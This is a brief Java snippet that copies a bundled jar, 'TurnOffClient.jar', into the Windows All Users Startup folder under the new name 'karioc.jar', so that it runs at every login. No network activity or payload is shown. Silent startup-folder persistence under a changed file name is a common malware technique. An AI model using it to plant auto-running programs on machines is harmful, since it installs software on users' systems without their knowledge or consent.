InputStream in = getClass().getResourceAsStream("/jars/TurnOffClient.jar");
OutputStream out = new FileOutputStream(new File("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\karioc.jar"));

// Transfer bytes from in to out
byte[] buf = new byte[1024];
int len;
while ((len = in.read(buf)) != -1) {
    out.write(buf, 0, len);
}
in.close();
out.close();